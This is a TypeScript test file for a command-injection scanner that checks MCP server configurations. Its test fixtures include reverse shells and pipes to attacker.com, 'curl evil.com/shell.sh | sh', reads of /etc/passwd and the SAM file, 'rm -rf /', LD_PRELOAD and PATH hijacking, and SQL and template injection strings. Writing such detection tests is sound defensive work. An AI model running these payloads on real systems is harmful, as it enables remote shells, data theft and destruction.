import { describe, it, expect, beforeEach } from 'vitest';
import { CommandInjectionScanner } from '../src/scanners/command-injection';
import { MCPServerConfig, Severity, VulnerabilityType } from '../src/types';

describe('CommandInjectionScanner', () => {
  let scanner: CommandInjectionScanner;

  beforeEach(() => {
    scanner = new CommandInjectionScanner();
  });

  describe('Shell Metacharacters', () => {
    it('should detect semicolon command chaining', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        args: ['server.js', '; cat /etc/passwd'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      expect(vulnerabilities.length).toBeGreaterThan(0);
      const cmdInj = vulnerabilities.find(v => v.type === VulnerabilityType.COMMAND_INJECTION);
      expect(cmdInj).toBeDefined();
      expect(cmdInj?.severity).toBe(Severity.CRITICAL);
    });

    it('should detect pipe operator', async () => {
      const config: MCPServerConfig = {
        command: 'echo',
        args: ['test | nc attacker.com 1234'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const pipeVuln = vulnerabilities.find(v => 
        v.details?.description?.includes('|')
      );
      expect(pipeVuln).toBeDefined();
    });

    it('should detect command substitution with backticks', async () => {
      const config: MCPServerConfig = {
        command: 'echo',
        args: ['`whoami`'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const backtickVuln = vulnerabilities.find(v => 
        v.title?.includes('Backtick command substitution')
      );
      expect(backtickVuln).toBeDefined();
      expect(backtickVuln?.severity).toBe(Severity.CRITICAL);
    });

    it('should detect $() command substitution', async () => {
      const config: MCPServerConfig = {
        command: 'echo',
        args: ['$(curl evil.com/shell.sh | sh)'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const cmdSubVuln = vulnerabilities.find(v => 
        v.title?.includes('Command substitution')
      );
      expect(cmdSubVuln).toBeDefined();
      expect(cmdSubVuln?.severity).toBe(Severity.CRITICAL);
    });
  });

  describe('Path Traversal', () => {
    it('should detect ../ path traversal', async () => {
      const config: MCPServerConfig = {
        command: 'cat',
        args: ['../../../etc/passwd'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const pathVuln = vulnerabilities.find(v => v.type === VulnerabilityType.PATH_TRAVERSAL);
      expect(pathVuln).toBeDefined();
      expect(pathVuln?.severity).toBe(Severity.HIGH);
    });

    it('should detect Windows path traversal', async () => {
      const config: MCPServerConfig = {
        command: 'type',
        args: ['..\\..\\..\\Windows\\System32\\config\\sam'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const pathVuln = vulnerabilities.find(v => v.type === VulnerabilityType.PATH_TRAVERSAL);
      expect(pathVuln).toBeDefined();
    });

    it('should detect /etc/passwd access attempts', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        args: ['--file=/etc/passwd'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const etcPasswd = vulnerabilities.find(v => 
        v.evidence?.value?.includes('/etc/passwd')
      );
      expect(etcPasswd).toBeDefined();
      expect(etcPasswd?.severity).toBe(Severity.CRITICAL);
    });
  });

  describe('Dangerous Commands', () => {
    it('should detect direct eval usage', async () => {
      const config: MCPServerConfig = {
        command: 'eval',
        args: ['user_input'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const evalVuln = vulnerabilities.find(v => 
        v.details?.description?.includes('eval')
      );
      expect(evalVuln).toBeDefined();
      expect(evalVuln?.severity).toBe(Severity.CRITICAL);
    });

    it('should detect shell execution commands', async () => {
      const config: MCPServerConfig = {
        command: 'bash',
        args: ['-c', 'user_command'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const shellVuln = vulnerabilities.find(v => 
        v.title?.includes('Dangerous command')
      );
      expect(shellVuln).toBeDefined();
      expect(shellVuln?.severity).toBe(Severity.CRITICAL);
    });

    it('should detect rm/delete commands', async () => {
      const config: MCPServerConfig = {
        command: 'rm',
        args: ['-rf', '/'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      expect(vulnerabilities.length).toBeGreaterThan(0);
      expect(vulnerabilities[0].severity).toBe(Severity.CRITICAL);
    });
  });

  describe('Environment Variable Injection', () => {
    it('should detect command injection in env vars', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        env: {
          'USER_INPUT': '; cat /etc/passwd',
          'COMMAND': '$(whoami)'
        },
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const envInjection = vulnerabilities.find(v => 
        v.details?.injectionType === 'env-injection'
      );
      expect(envInjection).toBeDefined();
    });

    it('should detect LD_PRELOAD hijacking', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        env: {
          'LD_PRELOAD': '/tmp/malicious.so'
        },
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const ldPreload = vulnerabilities.find(v => 
        v.details?.description?.includes('LD_PRELOAD')
      );
      expect(ldPreload).toBeDefined();
      expect(ldPreload?.severity).toBe(Severity.HIGH);
    });

    it('should detect PATH manipulation', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        env: {
          'PATH': '/tmp/evil:$PATH'
        },
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const pathManip = vulnerabilities.find(v => 
        v.details?.description?.includes('PATH')
      );
      expect(pathManip).toBeDefined();
    });
  });

  describe('SQL Injection', () => {
    it('should detect SQL injection patterns in database servers', async () => {
      const config: MCPServerConfig = {
        command: 'mysql',
        args: ['--execute', "SELECT * FROM users WHERE id = '1' OR '1'='1'"],
        metadata: { name: 'database-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const sqlInj = vulnerabilities.find(v => v.type === VulnerabilityType.SQL_INJECTION);
      expect(sqlInj).toBeDefined();
      expect(sqlInj?.severity).toBe(Severity.CRITICAL);
    });

    it('should detect DROP TABLE attempts', async () => {
      const config: MCPServerConfig = {
        command: 'psql',
        args: ['-c', '; DROP TABLE users; --'],
        metadata: { name: 'postgres-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const dropTable = vulnerabilities.find(v => 
        v.evidence?.value?.includes('DROP TABLE')
      );
      expect(dropTable).toBeDefined();
    });

    it('should detect UNION SELECT attacks', async () => {
      const config: MCPServerConfig = {
        command: 'sqlite3',
        args: ['db.sqlite', "SELECT * FROM products UNION SELECT password FROM users"],
        metadata: { name: 'sqlite-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const unionSelect = vulnerabilities.find(v => 
        v.evidence?.value?.includes('UNION SELECT')
      );
      expect(unionSelect).toBeDefined();
    });
  });

  describe('Template Injection', () => {
    it('should detect Jinja2 template injection', async () => {
      const config: MCPServerConfig = {
        command: 'python',
        args: ['render.py', '{{config.items()}}'],
        metadata: { name: 'template-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const templateInj = vulnerabilities.find(v => 
        v.title?.includes('template injection')
      );
      expect(templateInj).toBeDefined();
    });

    it('should detect JavaScript template injection', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        args: ['--template', '${process.env}'],
        metadata: { name: 'node-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const jsTemplate = vulnerabilities.find(v => 
        v.details?.injectionType === 'template-injection'
      );
      expect(jsTemplate).toBeDefined();
    });
  });

  describe('Code Execution Patterns', () => {
    it('should detect Python code execution', async () => {
      const config: MCPServerConfig = {
        command: 'python',
        args: ['-c', '__import__("os").system("id")'],
        metadata: { name: 'python-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const pythonExec = vulnerabilities.find(v => 
        v.title?.includes('Python code execution')
      );
      expect(pythonExec).toBeDefined();
      expect(pythonExec?.severity).toBe(Severity.CRITICAL);
    });

    it('should detect Node.js code execution', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        args: ['-e', 'require("child_process").exec("whoami")'],
        metadata: { name: 'node-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const nodeExec = vulnerabilities.find(v => 
        v.title?.includes('Node.js code execution')
      );
      expect(nodeExec).toBeDefined();
    });
  });

  describe('Network Commands', () => {
    it('should detect curl/wget commands', async () => {
      const config: MCPServerConfig = {
        command: 'sh',
        args: ['-c', 'curl http://evil.com/shell.sh | sh'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const networkCmd = vulnerabilities.find(v => 
        v.details?.injectionType === 'network-command'
      );
      expect(networkCmd).toBeDefined();
    });

    it('should detect netcat reverse shells', async () => {
      const config: MCPServerConfig = {
        command: 'nc',
        args: ['-e', '/bin/sh', 'attacker.com', '4444'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      expect(vulnerabilities.length).toBeGreaterThan(0);
      const reverseShell = vulnerabilities.find(v => 
        v.title?.includes('Netcat') || v.title?.includes('Dangerous command')
      );
      expect(reverseShell).toBeDefined();
    });
  });

  describe('Safe Patterns', () => {
    it('should not flag properly escaped metacharacters', async () => {
      const config: MCPServerConfig = {
        command: 'echo',
        args: ['"This is safe; no injection"'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      // May still flag the presence of metacharacters but with lower severity
      const critical = vulnerabilities.filter(v => v.severity === Severity.CRITICAL);
      expect(critical.length).toBe(0);
    });

    it('should not flag placeholder values', async () => {
      const config: MCPServerConfig = {
        command: 'node',
        env: {
          'COMMAND': '${SAFE_COMMAND}',
          'PATH': '<path-placeholder>'
        },
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      const envVulns = vulnerabilities.filter(v => 
        v.location?.path?.startsWith('env.')
      );
      expect(envVulns.length).toBe(0);
    });
  });

  describe('Remediation', () => {
    it('should provide appropriate remediation advice', async () => {
      const config: MCPServerConfig = {
        command: 'sh',
        args: ['-c', 'echo $(user_input)'],
        metadata: { name: 'test-server' }
      };

      const vulnerabilities = await scanner.scan(config);
      
      expect(vulnerabilities[0].remediation).toBeDefined();
      expect(vulnerabilities[0].remediation.description).toContain('Sanitize');
      expect(vulnerabilities[0].remediation.commands).toBeDefined();
      expect(vulnerabilities[0].remediation.documentation).toContain('owasp.org');
    });
  });
});
